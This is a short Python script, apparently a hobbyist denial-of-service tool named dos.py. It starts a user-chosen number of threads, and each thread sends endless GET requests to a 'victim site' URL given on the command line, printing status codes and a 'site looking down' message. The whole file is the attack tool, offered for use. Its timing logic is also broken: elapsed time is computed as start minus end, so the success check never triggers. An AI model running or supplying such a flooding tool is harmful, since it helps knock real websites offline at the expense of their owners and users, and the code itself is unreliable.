import requests 
import threading 
import time
import optparse
l=[]
def count_ck(time_):
    l.append(time_)
    for e in l:
        if e<=1:
            l.remove(e)
         
def count_Time():
    return round(time.time())

def make_request(url):
    while True:
        try:
            start_time =count_Time()
            result = requests.get(url)#must want https://user input (feature update)
            end_time = count_Time()
            final_time= start_time - end_time
            count_ck(final_time)
            if(final_time>60000):
                print("Dos success , site looking down ")
            
            elif(result.status_code == 200):
                print(f"Response code[{result.status_code} OK]")
                pass
            else:
                print(f"Responce code[{result.status_code}]")
        except:
            print(parser.print_help())
            break
usage = "Usage: dos.py [option] [argument]"
parser = optparse.OptionParser(usage=usage,add_help_option=False)
parser.add_option("-t",'--thread',dest="threads",type = 'int',help="its used to how many thread do you want")
parser.add_option("-v","--v",dest="victm_site",type ='string',help="its used attacker Url")
(option,argument) = parser.parse_args()
    
thread = option.threads
url = option.victm_site
if(thread==None and url == None):
    print(parser.print_help())
else:
    try:
        while(thread>=1):
            start_thread = threading.Thread(target=make_request,args=(url,))
            thread -=1
            start_thread.start()
            print("#{}thread...".format(thread))
    except:
        print(parser.print_help())
   


#still is working but some update add in featurely